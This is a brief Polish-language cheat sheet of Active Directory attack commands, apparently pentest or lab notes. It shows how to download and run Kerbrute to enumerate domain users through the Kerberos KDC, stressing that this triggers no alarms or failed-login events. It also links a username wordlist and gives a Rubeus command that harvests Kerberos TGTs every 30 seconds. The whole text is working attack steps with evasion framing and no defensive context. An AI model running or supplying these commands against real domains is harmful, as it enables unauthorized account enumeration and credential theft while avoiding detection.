# 1) Kerbrute (brute force to jedna ramka UDP to KDC nie generuje eventu zlego logowania)

### Instalacja
      ▪ wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
      ▪ chmod +x kerbrute_linux_amd64
### Enumeracja uzytkownikow (wyslanie jednej ramki UDP do KDC)
      ▪ Nie powoduje to alarmow ani zadnych czerwonych logow
      ▪ ./kerbrute_linux_amd64 userenum --dc <domena> -d <adres domeny> <lista>
      ▪ ./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt

# 2) Przydatne slowniki
      • Slownik
            ▪ https://raw.githubusercontent.com/Cryilllic/Active-Directory-Wordlists/master/User.txt

# 3) Proste zabiegi
      • Rubeus (zbiera TGT wysylane do KDC co 30 sekund)
            ▪ .\Rubeus.exe harvest /interval:30 



      
      
      
      
      
      
      
      
      
      
      
